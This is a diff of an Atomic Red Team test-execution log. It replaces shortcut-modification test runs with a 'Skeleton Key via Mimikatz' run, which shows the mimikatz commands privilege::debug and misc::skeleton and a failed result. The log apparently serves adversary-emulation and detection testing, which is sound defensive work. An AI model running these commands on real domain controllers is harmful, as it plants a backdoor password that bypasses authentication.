@@ -1,26 +1,25 @@
-START T1547.009 Test 1
+START T1556.001 Test 1
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
-Executing test: T1547.009-1 Shortcut Modification
+Executing test: T1556.001-1 Skeleton Key via Mimikatz
+.#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+mimikatz(commandline) # misc::skeleton
+ERROR kuhl_m_misc_skeleton ; kull_m_process_getVeryBasicModuleInformationsForName (0x00000000)
+mimikatz(commandline) # exit
+Bye!
 Exit code: 0
-Done executing test: T1547.009-1 Shortcut Modification
-END T1547.009 Test 1
+Done executing test: T1556.001-1 Skeleton Key via Mimikatz
+END T1556.001 Test 1
 PathToAtomicsFolder = C:\AtomicRedTeam\atomics
 
-Executing cleanup for test: T1547.009-1 Shortcut Modification
-Done executing cleanup for test: T1547.009-1 Shortcut Modification
-
-
-START T1547.009 Test 2
-PathToAtomicsFolder = C:\AtomicRedTeam\atomics
-
-Executing test: T1547.009-2 Create shortcut to cmd in startup folders
-Exit code: 0
-Done executing test: T1547.009-2 Create shortcut to cmd in startup folders
-END T1547.009 Test 2
-PathToAtomicsFolder = C:\AtomicRedTeam\atomics
-
-Executing cleanup for test: T1547.009-2 Create shortcut to cmd in startup folders
-Done executing cleanup for test: T1547.009-2 Create shortcut to cmd in startup folders
+Executing cleanup for test: T1556.001-1 Skeleton Key via Mimikatz
+Done executing cleanup for test: T1556.001-1 Skeleton Key via Mimikatz
 
 
